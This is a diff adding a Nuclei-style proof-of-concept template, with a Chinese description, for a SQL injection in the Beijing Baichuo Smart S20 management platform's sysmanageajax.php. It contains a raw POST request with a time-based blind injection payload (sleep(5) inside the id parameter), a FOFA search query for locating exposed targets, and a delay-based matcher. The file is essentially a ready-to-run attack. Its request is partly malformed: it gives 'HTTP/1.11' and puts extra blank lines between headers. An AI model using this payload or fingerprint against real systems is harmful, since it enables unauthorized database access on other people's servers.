@@ -1,0 +1,72 @@
+id: poc-cd95sf8qdfetlmir
+info:
+  name: 北京百绰智能S20管理平台sysmanageajax.php sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cd95sf8qdfetlmir
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cd95sf8qdfetlmir
+    fofa: title="Smart管理平台"
+http:
+- raw:
+  - 'POST /sysmanage/sysmanageajax.php HTTP/1.11
+
+
+    Cookie: PHPSESSID=b7e24f2cb8b51338e8531e0b50da49ee
+
+
+    Accept: */*
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: application/x-www-form-urlencoded;
+
+
+    Sec-Fetch-Dest: empty
+
+
+    Sec-Fetch-Mode: cors
+
+
+    Sec-Fetch-Site: same-origin
+
+
+    Te: trailers
+
+
+    Connection: close
+
+
+
+
+    src=manageadmin&type=add&id=(select*from(select+if(length(database())=3,sleep(5),1))a)|1|1&value=test2|123456
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
